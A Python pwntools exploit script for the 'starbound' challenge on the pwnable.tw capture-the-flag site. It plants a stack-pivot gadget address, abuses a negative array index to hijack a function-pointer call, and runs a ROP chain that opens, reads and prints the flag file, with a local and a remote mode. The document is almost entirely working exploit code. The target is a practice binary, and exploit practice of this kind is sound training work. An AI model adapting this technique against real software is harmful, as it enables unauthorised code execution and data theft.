from pwn import *

local = True
elf = 'starbound' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10202
    r = remote(ip,port)

context.arch = 'i386'

esp_1c = 0x8048e48 # 0x08048e48 : add esp, 0x1c ; ret
name = 0x80580D0
target_address = 0x80580d4
write_buffer = 0x80550c0

r.recvuntil('>')
r.sendline("6")
r.recvuntil('>')
r.sendline('2')
r.recvuntil(':')
target = "/home/starbound/flag\x00"
r.sendline(p32(esp_1c) + target)

open_plt = 0x8048970
read_plt = 0x8048a70
write_plt = 0x8048a30

pop_3 = 0x080494da # 0x080494da : pop ebx ; pop esi ; pop edi ; ret
# O_RDONLY	00000000
rop = p32(open_plt) + p32(pop_3) + p32(target_address) +p32(0) +p32(0)  
rop += p32(read_plt) + p32(pop_3) + p32(3) + p32(write_buffer)+ p32(0x50)
rop += p32(write_plt) + p32(pop_3) + p32(1) + p32(write_buffer)+ p32(0x50)
r.recvuntil('>')
r.sendline('1')
r.recvuntil('>')
raw_input('aaa')
r.sendline('-33     ' + rop )  #  (0x80580D0 - 0x8058154 )/4

r.interactive()